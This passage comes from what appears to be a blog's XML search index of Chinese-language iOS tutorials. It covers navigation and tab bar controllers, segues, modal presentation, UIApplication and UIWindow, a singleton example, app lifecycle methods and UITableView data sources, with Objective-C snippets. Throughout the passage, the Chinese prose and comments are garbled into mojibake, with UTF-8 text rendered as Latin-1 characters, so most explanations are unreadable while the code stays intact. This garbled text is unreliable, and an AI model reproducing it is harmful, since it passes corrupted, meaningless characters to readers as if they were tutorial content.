*)popViewControllerAnimated:(BOOL)animated;// å›žåˆ°æŒ‡å®šçš„å­æŽ§åˆ¶å™¨- (NSArray *)popToViewController:(UIViewController *)viewController animated:(BOOL)animated;// å›žåˆ°æ ¹æŽ§åˆ¶å™¨ï¼ˆæ ˆåº•æŽ§åˆ¶å™¨ï¼‰- (NSArray *)popToRootViewControllerAnimated:(BOOL)animated; å¦‚ä½•ä¿®æ”¹å¯¼èˆªæ çš„å†…å®¹ æ˜¾ç¤ºåœ¨æˆ‘ä»¬çœ¼å‰çš„æ°¸è¿œæ˜¯æ ˆè®¢æŽ§åˆ¶å™¨ å¯¼èˆªæ çš„å†…å®¹ç”±æ ˆé¡¶æŽ§åˆ¶å™¨çš„navigationItemå±žæ€§å†³å®š å¯¼èˆªæŽ§åˆ¶å™¨æ˜¯ä»¥æ ˆçš„å½¢å¼å…ˆè¿›åŽå‡ºåŽè¿›å…ˆå‡º(æ˜¯ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨çš„ æ•°ç»„å°±æ˜¯ä»¥æ ˆçš„å½¢å¼å­˜å‚¨çš„) å¯¼èˆªæ è¿”å›žæŒ‰é’®çš„æ–‡å­—æ˜¯ç”±ä¸Šä¸€ä¸ªæŽ§åˆ¶å™¨å†³å®šçš„(ç‰¹ä¾‹) UINavigationItemæœ‰ä»¥ä¸‹å±žæ€§å½±å“ç€å¯¼èˆªæ çš„å†…å®¹1234567891011// å·¦ä¸Šè§’çš„è¿”å›žæŒ‰é’®@property(nonatomic,retain) UIBarButtonItem *backBarButtonItem;// ä¸­é—´çš„æ ‡é¢˜è§†å›¾@property(nonatomic,retain) UIView *titleView;// ä¸­é—´çš„æ ‡é¢˜æ–‡å­—@property(nonatomic,copy) NSString *title;// å·¦ä¸Šè§’çš„è§†å›¾@property(nonatomic,retain) UIBarButtonItem *leftBarButtonItem;// å³ä¸Šè§’çš„è§†å›¾UIBarButtonItem *rightBarButtonItem@property(nonatomic,retain) UIBarButtonItem *rightBarButtonItem; Segueçš„å±žæ€§ æ¯ä¸€ä¸ªSegueå¯¹è±¡ï¼Œéƒ½æœ‰3ä¸ªå±žæ€§ 123456// å”¯ä¸€æ ‡è¯†@property (nonatomic, readonly) NSString *identifier;// æ¥æºæŽ§åˆ¶å™¨@property (nonatomic, readonly) id sourceViewController;// ç›®æ ‡æŽ§åˆ¶å™¨@property (nonatomic, readonly) id destinationViewController; Segueçš„ç±»åž‹ è‡ªåŠ¨åž‹ï¼šç‚¹å‡»æŸä¸ªæŽ§ä»¶åŽï¼ˆæ¯”å¦‚æŒ‰é’®ï¼‰ï¼Œè‡ªåŠ¨æ‰§è¡ŒSegueï¼Œè‡ªåŠ¨å®Œæˆç•Œé¢è·³è½¬ æ‰‹åŠ¨åž‹ï¼šéœ€è¦é€šè¿‡å†™ä»£ç æ‰‹åŠ¨æ‰§è¡ŒSegueï¼Œæ‰èƒ½å®Œæˆç•Œé¢è·³è½¬ è®¾ç½®å¯¼èˆªæŽ§åˆ¶å™¨çš„å¯¼èˆªæ çš„ä¸»é¢˜123456789101112131415161718192021222324/** åªä¼šåœ¨ç³»ç»Ÿç¬¬ä¸€æ¬¡ç”¨è¿™ç±»çš„æ—¶å€™è°ƒç”¨(åªä¼šè°ƒç”¨ä¸€æ¬¡) */+ (void)initialize&#123;// 1.è®¾ç½®å¯¼èˆªæ ä¸»é¢˜æ ·å¼ UINavigationBar *navBar = [UINavigationBar appearance]; // 1.1.è®¾ç½®å¯¼èˆªæ èƒŒæ™¯å›¾ç‰‡ NSString *navImageName = nil; if (ios7) &#123; navImageName = @"NavBar64"; navBar.tintColor = [UIColor whiteColor]; // è®¾ç½®å¯¼èˆªæ çš„è¿”å›žæŒ‰é’®é¢œè‰²ä¸ºç™½è‰² &#125;else&#123; // ios6 navImageName = @"NavBar"; &#125; [navBar setBackgroundImage:[UIImage imageNamed:navImageName] forBarMetrics:UIBarMetricsDefault]; // 1.2.è®¾ç½®å¯¼èˆªæ çš„å­—ä½“é¢œè‰²ä¸ºç™½è‰² NSDictionary *attrButes = @&#123; NSForegroundColorAttributeName : [UIColor whiteColor], NSFontAttributeName : [UIFont systemFontOfSize:18] &#125;; [navBar setTitleTextAttributes:attrButes];&#125; æ³¨æ„ç‚¹ ä»¥åŽçœ‹åˆ°ç³»ç»Ÿè‡ªå¸¦çš„ç±»å¸¦æœ‰item,å°±æ˜¯è‹¹æžœæä¾›çš„æ¨¡åž‹ UINavigationItem : è®¾ç½®å¯¼èˆªæ¡å†…å®¹(å¥¹ä¸æ˜¯æŽ§ä»¶ æ˜¯æ¨¡åž‹) UIBarButtonItem : è®¾ç½®å¯¼èˆªæ¡ä¸ŠæŒ‰é’®çš„å†…å®¹ (æ¨¡åž‹) UITabBarController è·ŸUINavigationControllerç±»ä¼¼ï¼ŒUITabBarControllerä¹Ÿå¯ä»¥è½»æ¾åœ°ç®¡ç†å¤šä¸ªæŽ§åˆ¶å™¨ï¼Œè½»æ¾å®ŒæˆæŽ§åˆ¶å™¨ä¹‹é—´çš„åˆ‡æ¢ï¼Œå…¸åž‹ä¾‹å­å°±æ˜¯QQã€å¾®ä¿¡ç­‰åº”ç”¨. UITabBarControllerçš„ä½¿ç”¨æ­¥éª¤ åˆå§‹åŒ–UITabBarController è®¾ç½®UIWindowçš„rootViewControllerä¸ºUITabBarController æ ¹æ®å…·ä½“æƒ…å†µï¼Œé€šè¿‡addChildViewControlleræ–¹æ³•æ·»åŠ å¯¹åº”ä¸ªæ•°çš„å­æŽ§åˆ¶å™¨ UITabBarControlleræ·»åŠ æŽ§åˆ¶å™¨çš„æ–¹å¼æœ‰2ç§12345- æ·»åŠ å•ä¸ªå­æŽ§åˆ¶å™¨- (void)addChildViewController:(UIViewController *)childController; - è®¾ç½®å­æŽ§åˆ¶å™¨æ•°ç»„@property(nonatomic,copy) NSArray *viewControllers; UITabBarControlleræ³¨æ„ç‚¹ å¦‚æžœUITabBarControlleræœ‰Nä¸ªå­æŽ§åˆ¶å™¨ï¼Œé‚£ä¹ˆUITabBarå†…éƒ¨å°±ä¼šæœ‰Nä¸ªUITabBarButtonä½œä¸ºå­æŽ§ä»¶ UITabBarButtoné‡Œé¢æ˜¾ç¤ºä»€ä¹ˆå†…å®¹ï¼Œç”±å¯¹åº”å­æŽ§åˆ¶å™¨çš„tabBarItemå±žæ€§å†³å®š å¤šæŽ§åˆ¶å™¨ç®¡ç†segueè·³è½¬ä¹‹å‰ä¼šè°ƒç”¨çš„æ–¹æ³• Modal é™¤äº†pushä¹‹å¤–ï¼Œè¿˜æœ‰å¦å¤–ä¸€ç§æŽ§åˆ¶å™¨çš„åˆ‡æ¢æ–¹å¼ï¼Œé‚£å°±æ˜¯Modal (èƒ½ç”¨pushçš„å°½é‡ç”¨pushå®žçŽ°,å…¬å¸æœ‰ç‰¹æ®Šéœ€æ±‚å¯ä»¥ç”¨modal) ä»»ä½•æŽ§åˆ¶å™¨éƒ½èƒ½é€šè¿‡Modalçš„å½¢å¼å±•ç¤ºå‡ºæ¥ Modalçš„é»˜è®¤æ•ˆæžœï¼šæ–°æŽ§åˆ¶å™¨ä»Žå±å¹•çš„æœ€åº•éƒ¨å¾€ä¸Šé’»ï¼Œç›´åˆ°ç›–ä½ä¹‹å‰çš„æŽ§åˆ¶å™¨ä¸ºæ­¢ 12345// ä»¥Modalçš„å½¢å¼å±•ç¤ºæŽ§åˆ¶å™¨- (void)presentViewController:(UIViewController *)viewControllerToPresent animated: (BOOL)flag completion:(void (^)(void))completion// å…³é—­å½“åˆModalå‡ºæ¥çš„æŽ§åˆ¶å™¨- (void)dismissViewControllerAnimated: (BOOL)flag completion: (void (^)(void))completion; è§„å¾‹ modalå‡ºè°,è°å°±èƒ½dismiss è°modal,è°ä¹Ÿå¯ä»¥dismiss dismissViewController æ°¸è¿œç§»é™¤æœ€åŽæ˜¾ç¤ºçš„æŽ§åˆ¶å™¨ æ³¨æ„ å¦‚æžœä¸€ä¸ªæŽ§åˆ¶å™¨çš„Viewæ˜¾ç¤ºåˆ°å±å¹•ä¸Š,è¿™ä¸ªæŽ§åˆ¶å™¨ä¸€å®šä¸èƒ½è¢«é”€æ¯(è¦è¢«å¼ºå¼•ç”¨). è°modalè°å°±å¼ºå¼•ç”¨modalå‡ºæ¥çš„æŽ§åˆ¶å™¨ å¤šæŽ§åˆ¶å™¨ ç®¡ç†UIWindow ä¸»çª—å£çš„æ¦‚å¿µ æ–°å»ºUIWindowUIViewController æŽ§åˆ¶å™¨çš„åˆ›å»ºæ–¹å¼ æŽ§åˆ¶å™¨viewçš„åˆ›å»ºæ–¹å¼ viewçš„æ‡’åŠ è½½ 1loadViewã€viewDidLoadã€viewDidUnloadã€didReceiveMemoryWarning UINavigationController é€šè¿‡éžstoryboardæ–¹å¼ åˆ›å»ºå¯¼èˆªæŽ§åˆ¶å™¨ è®¾ç½®UIWindowçš„æ ¹æŽ§åˆ¶å™¨ push 1ä¸ªã€2ä¸ªã€3ä¸ª å­æŽ§åˆ¶å™¨ è§£é‡Špushçš„åŽŸç†(æ ˆã€å¯¼èˆªæŽ§åˆ¶å™¨çš„ç®¡ç†è¿‡ç¨‹) æ ˆåº•ã€æ ˆé¡¶æŽ§åˆ¶å™¨çš„æ¦‚å¿µ å¦‚ä½•è®¾ç½®å¯¼èˆªæ ä¸Šé¢çš„å†…å®¹ã€è¿”å›žæ–‡å­—çš„è®¾ç½® popçš„æ–¹æ³•ä½¿ç”¨ pushå’ŒaddChildã€viewControllerså’ŒchildViewControllerçš„å…³ç³» é€šè¿‡storyboardæ–¹å¼ å¤šæŽ§åˆ¶å™¨çš„æ•°æ®çš„ä¼ é€’æ–¹å¼(ä¸¤ç§):é¡ºä¼ å’Œé€†ä¼  é¡ºä¼  æŽ§åˆ¶å™¨çš„è·³è½¬æ–¹å‘: A C æ•°æ®çš„ä¼ é€’æ–¹å‘ : A C æ•°æ®çš„ä¼ é€’æ–¹å¼ : åœ¨Açš„prepareForSegue:sender:æ–¹æ³•ä¸­æ ¹æ®segueå‚æ•°å–å¾—destinationViewController, ä¹Ÿå°±æ˜¯æŽ§åˆ¶å™¨C,ç›´æŽ¥ç»™æŽ§åˆ¶å™¨Cä¼ é€’æ•°æ®(è¦åœ¨Cçš„viewDidLoadæ–¹æ³•ä¸­å–å¾—æ•°æ®,æ¥èµ‹å€¼ç»™ç•Œé¢ä¸Šçš„UIæŽ§ä»¶) é€†ä¼  æŽ§åˆ¶å™¨çš„è·³è½¬æ–¹å‘: A C æ•°æ®çš„ä¼ é€’æ–¹å‘ : C A æ•°æ®çš„ä¼ é€’æ–¹å¼: è®©Aæˆä¸ºCçš„ä»£ç†,åœ¨Cä¸­è°ƒç”¨Açš„ä»£ç†æ–¹æ³•,é€šè¿‡ä»£ç†æ–¹æ³•çš„å‚æ•°ä¼ é€’æ•°æ®ç»™A Appä¸»æµUIæ¡†æž¶ç»“æž„]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>storyboard</tag>
        <tag>ViewController</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹UIApplication & UIWindow & åˆ›å»ºå•ä¾‹]]></title>
    <url>%2Farchives%2F55fb9a70.html</url>
    <content type="text"><![CDATA[UIApplicationå¯¹è±¡æ˜¯åº”ç”¨ç¨‹åºçš„è±¡å¾ï¼Œæ¯ä¸€ä¸ªåº”ç”¨éƒ½æœ‰è‡ªå·±çš„UIApplicationå¯¹è±¡ï¼Œè€Œä¸”æ˜¯å•ä¾‹çš„ã€‚ UIApplication UIApplicationå¯¹è±¡æ˜¯åº”ç”¨ç¨‹åºçš„è±¡å¾ æ¯ä¸€ä¸ªåº”ç”¨éƒ½æœ‰è‡ªå·±çš„UIApplicationå¯¹è±¡ï¼Œè€Œä¸”æ˜¯å•ä¾‹çš„ã€‚ é€šè¿‡[UIApplication sharedApplication]åˆ›å»ºï¼Œåˆ›å»ºå•ä¾‹åŸºæœ¬ä»¥shareå¼€å¤´ ä¸€ä¸ªiOSç¨‹åºå¯åŠ¨åŽåˆ›å»ºçš„ç¬¬ä¸€ä¸ªå¯¹è±¡å°±æ˜¯UIApplicationå¯¹è±¡ åˆ©ç”¨UIApplicationå¯¹è±¡ï¼Œèƒ½è¿›è¡Œä¸€äº›åº”ç”¨çº§åˆ«çš„æ“ä½œï¼Œå¦‚ï¼š è®¾ç½®æé†’æ•°å­—ï¼Œå¾—è¦æ³¨å†Œç”¨æˆ·é€šçŸ¥ å¯ä»¥è®¾ç½®è”ç½‘çŠ¶æ€ï¼šå°†NetworkActivityIndicatorVisibleå±žæ€§è®¾ä¸ºYES å¯ä»¥è®¾ç½®çŠ¶æ€æ ï¼šé»˜è®¤æŽ§åˆ¶å™¨ç®¡ç†ï¼Œè¦åœ¨infoæ–‡ä»¶ä¸­è®¾ç½®ä¿®æ”¹ç„¶åŽè°ƒç”¨setStatusBarHidden: withAnimation:æ–¹æ³• å¯ä»¥æ‰“ç”µè¯ï¼Œå‘çŸ­ä¿¡ï¼Œæ‰“å¼€ç½‘é¡µï¼šä½¿ç”¨OpenURlæ–¹æ³• ä»£ç†æ–¹æ³•ï¼šç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆ 1234567 // è®¾ç½®æé†’æ•°å­— app.applicationIconBadgeNumber = 10;UIUserNotificationSettings *settings = [UIUserNotificationSettings settingsForTypes:UIUserNotificationTypeBadge categories:nil];// æ³¨å†Œä¸€ä¸ªç”¨æˆ·çš„é€šçŸ¥[app registerUserNotificationSettings:settings]; UIWindow UIWindowæ˜¯ä¸€ç§ç‰¹æ®Šçš„UIViewï¼Œé€šå¸¸åœ¨ä¸€ä¸ªappä¸­åªä¼šæœ‰ä¸€ä¸ªUIWindow iOSç¨‹åºå¯åŠ¨å®Œæ¯•åŽï¼Œåˆ›å»ºçš„ç¬¬ä¸€ä¸ªè§†å›¾æŽ§ä»¶å°±æ˜¯UIWindowï¼ŒæŽ¥ç€åˆ›å»ºæŽ§åˆ¶å™¨çš„viewï¼Œæœ€åŽå°†æŽ§åˆ¶å™¨çš„viewæ·»åŠ åˆ°UIWindowä¸Šï¼ŒäºŽæ˜¯æŽ§åˆ¶å™¨çš„viewå°±æ˜¾ç¤ºåœ¨å±å¹•ä¸Šäº† ä¸€ä¸ªiOSç¨‹åºä¹‹æ‰€ä»¥èƒ½æ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œå®Œå…¨æ˜¯å› ä¸ºå®ƒæœ‰UIWindowã€‚ä¹Ÿå°±è¯´ï¼Œæ²¡æœ‰UIWindowï¼Œå°±çœ‹ä¸è§ä»»ä½•UIç•Œé¢ã€‚ è‡ªå®šä¹‰ åˆ›å»ºçª—å£ï¼Œè®¾ç½®frameã€‚ æ·»åŠ å­æŽ§ä»¶ï¼Œä¸€èˆ¬æŠŠçª—å£çš„æ ¹æŽ§åˆ¶å™¨æ·»åŠ ä¸ŠåŽ»ï¼Œé€šè¿‡è®¾ç½®rootViewControllerå°±å¯ä»¥æŠŠæ ¹æŽ§åˆ¶å™¨çš„viewæ·»åŠ åˆ°çª—å£ä¸Šã€‚ çª—å£æ˜¾ç¤ºã€‚è®¾ç½®çª—å£çš„hiddleå±žæ€§ï¼›åº”ç”¨ç¨‹åºæ˜¯æœ‰ä¸»çª—å£ï¼Œé€šå¸¸è°ƒç”¨makeKeyAndVisibleã€‚ å±žæ€§ï¼š windonså±žæ€§ï¼Œå¯ä»¥è¯†åˆ«åº”ç”¨ç¨‹åºä¸­å“ªäº›æŽ§ä»¶è¿˜æ˜¯çª—å£ï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šï¼ŒçŠ¶æ€æ ã€‚ windowå±‚çº§ windowå±‚çº§ï¼Œalert(2000) &gt; statusBar(1000) &gt; normal(0) UIWindowLevel æœ¬è´¨æ˜¯CGFloat ç›¸åŒlevelçš„å¯ä»¥è¿›è¡ŒåŠ å‡è¿ç®—,è°ƒæ•´ä¼˜å…ˆçº§ã€‚ å•ä¾‹å®žçŽ° ä¸ç®¡æ€Žä¹ˆåˆ›å»º,åªä¼šåˆ†é…ä¸€æ¬¡å†…å­˜ æ•´ä¸ªappä¸­,åªä¼šåˆ†é…ä¸€æ¬¡ ä»¿è‹¹æžœå®žçŽ°å•ä¾‹ .hæ–‡ä»¶ 12345#import &lt;Foundation/Foundation.h&gt;@interface Person : NSObject+ (instancetype)sharedPerson;@end .mæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233#import "Person.h"// 1.ç¨‹åºä¸€å¯åŠ¨çš„æ—¶å€™å°±åˆ›å»ºè¿™ä¸ªç±»çš„å¯¹è±¡// 2.ä¸å…è®¸å¤–ç•Œé€šè¿‡alloc,åˆ†é…å†…å­˜,åªè¦ä¸€è°ƒç”¨,å°±å´©æºƒ@implementation Person// äººçš„å®žä¾‹static Person *_instance;// ç¨‹åºè¿è¡Œçš„æ—¶å€™å°±ä¼šåŠ è½½ç±»+ (void)load&#123; _instance = [[self alloc] init];&#125;// exception 'NSInternalInconsistencyException', reason: 'There can only be one UIApplication instance.'+ (instancetype)alloc&#123; if (_instance) &#123; // å´©æºƒ // åˆ›å»ºå¼‚å¸¸å¯¹è±¡ NSException *excption = [NSException exceptionWithName:@"NSInternalInconsistencyException" reason:@"There can only be one Person instance." userInfo:nil]; // æŠ›å¼‚å¸¸ [excption raise]; &#125; // super -&gt; [NSObject alloc] return [super alloc];&#125;+ (instancetype)sharedPerson&#123; return _instance;&#125;@end]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UIApplication</tag>
        <tag>UIWindow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹APPçš„å¯åŠ¨è¿‡ç¨‹åŠç”Ÿå‘½å‘¨æœŸç›¸å…³]]></title>
    <url>%2Farchives%2Ff571ec2e.html</url>
    <content type="text"><![CDATA[å…³äºŽAppå¯åŠ¨åŠåˆå§‹åŒ–ç›¸å…³çš„çŸ¥è¯†ç‚¹äº†è§£ã€‚ ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹Appå¯åŠ¨ main -&gt; UIApplicationMain -&gt; é€šçŸ¥ä»£ç†åšäº‹æƒ… UIApplicationMainåº•å±‚å®žçŽ°ï¼š 1234// principalClassName:æè¿°UIApplicationçš„ç±»åå­—ç¬¦ä¸²// delegateClassName:æè¿°UIApplicationä»£ç†çš„ç±»åå­—ç¬¦ä¸²int UIApplicationMain(int argc, char *argv[], NSString *principalClassName, NSString *delegateClassName); ç¨‹åºå¯åŠ¨çš„å®Œæ•´è¿‡ç¨‹ mainå‡½æ•° UIApplicationMain åˆ›å»ºUIApplicationå¯¹è±¡ åˆ›å»ºUIApplicationçš„delegateå¯¹è±¡ delegateå¯¹è±¡å¼€å§‹å¤„ç†(ç›‘å¬)ç³»ç»Ÿäº‹ä»¶(åˆ¤æ–­æœ‰æ— storyboard) A. æ ¹æ®Info.plistèŽ·å¾—æœ€ä¸»è¦storyboardçš„æ–‡ä»¶å,åŠ è½½æœ€ä¸»è¦çš„storyboard(æœ‰storyboard) åˆ›å»ºUIWindow åˆ›å»ºå’Œè®¾ç½®UIWindowçš„rootViewController æ˜¾ç¤ºçª—å£ B. æ²¡æœ‰storyboard ç¨‹åºå¯åŠ¨å®Œæ¯•çš„æ—¶å€™, å°±ä¼šè°ƒç”¨ä»£ç†çš„application:didFinishLaunchingWithOptions:æ–¹æ³• åœ¨application:didFinishLaunchingWithOptions:ä¸­åˆ›å»ºUIWindow åˆ›å»ºå’Œè®¾ç½®UIWindowçš„rootViewController æ˜¾ç¤ºçª—å£ 12345678910111213141516171819202122232425262728// åœ¨å¼€å‘ä¸­é€šå¸¸åœ¨ç¨‹åºå¯åŠ¨å®Œæˆçš„æ—¶å€™æ‰‹åŠ¨åˆ›å»ºçª—å£- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123; // 1.åˆ›å»ºçª—å£ // è®©çª—å£æ˜¾ç¤º:1.å¿…é¡»è¦æœ‰å¼ºå¼•ç”¨2.çª—å£ä¹Ÿæ˜¯æŽ§ä»¶,æ˜¯æŽ§ä»¶è¦æƒ³å±•ç¤ºå‡ºæ¥,å¿…é¡»è®¾ç½®å°ºå¯¸ self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds]; self.window.backgroundColor = [UIColor yellowColor]; // 2.åˆ›å»ºæŽ§åˆ¶å™¨ UIViewController *vc = [[UIViewController alloc] init]; vc.view.backgroundColor = [UIColor greenColor]; // 2.1 è®¾ç½®çª—å£çš„æ ¹æŽ§åˆ¶å™¨,åº•å±‚:1.å°±ä¼šæŠŠæŽ§åˆ¶å™¨çš„viewæ·»åŠ åˆ°çª—å£ä¸Š // 2.ç»™ç•Œé¢æ·»åŠ æ—‹è½¬åŠŸèƒ½ self.window.rootViewController = vc; NSLog(@"%@",application.keyWindow); // 3.æ˜¾ç¤ºçª—å£:ç§°ä¸ºä¸»çª—å£,å¹¶ä¸”æ˜¾ç¤ºçª—å£ [self.window makeKeyAndVisible]; // 1. self.window.hidden = NO; // 2. ç§°ä¸ºåº”ç”¨ç¨‹åºçš„ä¸»çª—å£ NSLog(@"%@",application.keyWindow); NSLog(@"%@",self.window); return YES;&#125; Applicationç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä»‹ç» AppDelegateæ²¡æœ‰è‡ªå·±åˆ›å»ºï¼Œç³»ç»Ÿä¼šé»˜è®¤å¸®æˆ‘ä»¬åˆ›å»ºã€‚ å¤„ç†åº”ç”¨ç¨‹åºçš„ä¸€äº›ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼šä»¥applicationå¼€å¤´ 123456789// ç¨‹åºå¯åŠ¨å®Œæˆçš„æ—¶å€™è°ƒç”¨// __func__ï¼šè¡¨ç¤ºå½“å‰çš„æ–¹æ³•åœ¨å“ªä¸ªç±»é‡Œé¢è°ƒç”¨// -[AppDelegate application:didFinishLaunchingWithOptions:]- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123; NSLog(@"%s",__func__); // Override point for customization after application launch. return YES;&#125; 123456// å½“åº”ç”¨ç¨‹åºå¤±åŽ»ç„¦ç‚¹çš„æ—¶å€™è°ƒç”¨- (void)applicationWillResignActive:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state. // Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.&#125; 1234567// å½“åº”ç”¨ç¨‹åºè¿›å…¥åŽå°çš„æ—¶å€™è°ƒç”¨// ä¿å­˜ä¸€äº›æ•°æ®- (void)applicationDidEnterBackground:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.&#125; 12345// å½“åº”ç”¨ç¨‹åºè¿›å…¥è¿›å°çš„æ—¶å€™è°ƒç”¨- (void)applicationWillEnterForeground:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.&#125; 123456// å½“åº”ç”¨ç¨‹åºèŽ·å–ç„¦ç‚¹çš„æ—¶å€™è°ƒç”¨// å½“ç”¨æˆ·å®Œå…¨èŽ·å–ç„¦ç‚¹çš„æ—¶å€™ï¼Œæ‰èƒ½è·Ÿç•Œé¢äº¤äº’- (void)applicationDidBecomeActive:(UIApplication *)application &#123; NSLog(@"%s",__func__); // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.&#125; 1234// å½“åº”ç”¨ç¨‹åºå…³é—­çš„æ—¶å€™è°ƒç”¨- (void)applicationWillTerminate:(UIApplication *)application &#123; // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.&#125; 123456// å½“ç¨‹åºæŽ¥æ”¶åˆ°å†…å­˜è­¦å‘Šçš„æ—¶å€™è°ƒç”¨- (void)applicationDidReceiveMemoryWarning:(UIApplication *)application&#123; // æ¸…ç©ºå›¾ç‰‡ç¼“å­˜ NSLog(@"%s",__func__);&#125; ç±»ç›¸å…³çš„load loadæ–¹æ³•ä¼šåœ¨åŠ è½½ç±»çš„æ—¶å€™å°±è¢«è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯iosåº”ç”¨å¯åŠ¨çš„æ—¶å€™ï¼Œå°±ä¼šåŠ è½½æ‰€æœ‰çš„ç±»ï¼Œå°±ä¼šè°ƒç”¨æ¯ä¸ªç±»çš„ + load æ–¹æ³•ã€‚initialize initializeæ–¹æ³•ä¼šåœ¨ç¬¬ä¸€æ¬¡åˆå§‹åŒ–è¿™ä¸ªç±»ä¹‹å‰è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥åˆå§‹åŒ–é™æ€å˜é‡ã€‚ LoadView ä»€ä¹ˆæ—¶å€™è°ƒç”¨ï¼šç¬¬ä¸€æ¬¡ä½¿ç”¨æŽ§åˆ¶å™¨çš„viewçš„æ—¶å€™è°ƒç”¨ ä½œç”¨ï¼šåŠ è½½æŽ§åˆ¶å™¨çš„view æ³¨æ„: åªè¦é‡å†™loadViewï¼Œé‡Œé¢å°±ä¸è¦è°ƒç”¨ [super loadView] åœ¨loadViewæ–¹æ³•ä¸­ï¼Œå¦‚æžœæ²¡æœ‰ç»™æŽ§åˆ¶å™¨çš„viewèµ‹å€¼,å°±ä¸èƒ½èŽ·å–æŽ§åˆ¶å™¨çš„viewï¼Œå¦åˆ™ä¼šå¯¼è‡´æ­»å¾ªçŽ¯ ä¸€æ—¦é‡å†™loadViewæ–¹æ³•,è¡¨ç¤ºéœ€è¦è‡ªå·±åˆ›å»ºæŽ§åˆ¶å™¨çš„view åœ¨å¼€å‘ä¸­loadViewåº”ç”¨åœºæ™¯: ä¸€å¼€å§‹æŽ§åˆ¶å™¨å°±æƒ³è¦å±•ç¤ºä¸€å¼ å›¾ç‰‡ï¼Œå°±å¯ä»¥ç›´æŽ¥è®©æŽ§åˆ¶å™¨çš„viewæ˜¯UIImageView UIWedViewï¼šå±•ç¤ºç½‘é¡µï¼Œè®¾ç½®wenbViewä¸ºæŽ§åˆ¶å™¨View é‡å†™LoadViewï¼Œå¯ä»¥å‡å°‘å†…å­˜ä½¿ç”¨ï¼Œç›´æŽ¥å¸®ä½ åˆ›å»ºæŽ§åˆ¶å™¨æœ€æƒ³è¦çš„view [super loadView]ï¼šé¦–å…ˆåˆ¤æ–­ä¸‹æœ‰æ²¡æœ‰æŒ‡å®šstoryboardæˆ–è€…æŒ‡å®šxib,å¦‚æžœæŒ‡å®šäº†ï¼Œå°±ä¼šå¸®ä½ åŠ è½½æŒ‡å®šçš„æŽ§åˆ¶å™¨çš„view 123456789101112131415161718192021- (void)loadView&#123; // super -&gt; UIViewController // [super loadView]; // åˆ›å»ºæŽ§åˆ¶å™¨çš„view // åªè¦å½“å‰æŽ§åˆ¶å™¨æ˜¯æ ¹æŽ§åˆ¶å™¨,ç³»ç»Ÿä¼šè‡ªåŠ¨è®¾ç½®æŽ§åˆ¶å™¨çš„viewå°ºå¯¸(ä½†æ˜¯ä¸å»ºè®®è¿™ä¹ˆå†™,å¼€å‘ä¸­ç›´æŽ¥æŒ‡å®šä¸º[UIScreen mainScreen].bounds) UIView *vcView = [[UIView alloc] initWithFrame:CGRectZero]; vcView.backgroundColor = [UIColor redColor]; self.view = vcView;&#125;// ç³»ç»Ÿå¯åŠ¨ä¼šé»˜è®¤è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªç³»ç»Ÿæ–¹æ³•åˆ¤æ–­viewæ˜¯å¦ä¸ºç©º ä¸ºç©ºåˆ™ä¼šè°ƒç”¨loadViewæ–¹æ³•//- (UIView *)view//&#123;// if (_view == nil) &#123;// [self loadView];// &#125;// return _view;//&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘å¸¸ç”¨æŽ§ä»¶ä¹‹UITableView]]></title>
    <url>%2Farchives%2Ff9786cb4.html</url>
    <content type="text"><![CDATA[UITableViewå¯ä»¥è¯´æ˜¯iOSå¼€å‘ä¸­æœ€å¸¸ç”¨çš„æŽ§ä»¶ä¹‹ä¸€äº†ï¼Œå¸¸ç”¨äºŽå±•ç¤ºè¡¨å•åŠåˆ—è¡¨ç±»æ•°æ®ã€‚ UITableViewå¦‚ä½•å±•ç¤ºæ•°æ®è®¾ç½®æ•°æ®æºå¯¹è±¡1self.tableView.dataSource = self; æ•°æ®æºå¯¹è±¡è¦éµå®ˆåè®®123@interface ViewController () &lt;UITableViewDataSource&gt;@end å®žçŽ°æ•°æ®æºæ–¹æ³•1234567891011121314// å¤šå°‘ç»„æ•°æ®- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView;// æ¯ä¸€ç»„æœ‰å¤šå°‘è¡Œæ•°æ®- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section;// æ¯ä¸€è¡Œæ˜¾ç¤ºä»€ä¹ˆå†…å®¹- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath;// æ¯ä¸€ç»„çš„å¤´éƒ¨- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section;// 